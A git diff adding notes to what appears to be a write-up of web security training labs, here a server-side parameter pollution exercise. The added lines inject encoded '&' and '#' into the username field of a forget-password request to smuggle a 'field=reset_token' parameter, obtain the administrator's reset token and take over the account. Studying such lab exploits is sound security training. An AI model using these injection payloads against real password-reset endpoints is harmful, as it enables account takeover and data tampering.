@@ -33,7 +33,23 @@ Observe that the JSON structure in the GET response includes a chosen_discount p
 - Now, `"chosen_discount":{"percentage":100}` to solve the Lab.
 
 # 4. 
+Forget PWD > Send POST /forget-password request to Repeater > try to find the field after username.
 
+```
+Using &, # (Encoded)
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator
+
+Observe Error:
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator&x=y (to check if business logic fails)
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator# (To truncate the next parameter) > Invalid Field i.e field is the Parameter
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator&field=x# (try to give invalid value & observe error)
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator&field=$x$# (In Intruder, use Server Side Variable name List)
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator%26field=email%23 (email value returns 200)
+csrf=CIlPp7mw3jOCiOHaYTA4yvfgIhm02LyV&username=administrator%26field=reset_token%23 (returns a token value)
+Copy the token value & send pass it to reset pwd link > PWD reset page will show > set the pwd > login to Admin account & del the User > DONE.
+
+```
 
 
 
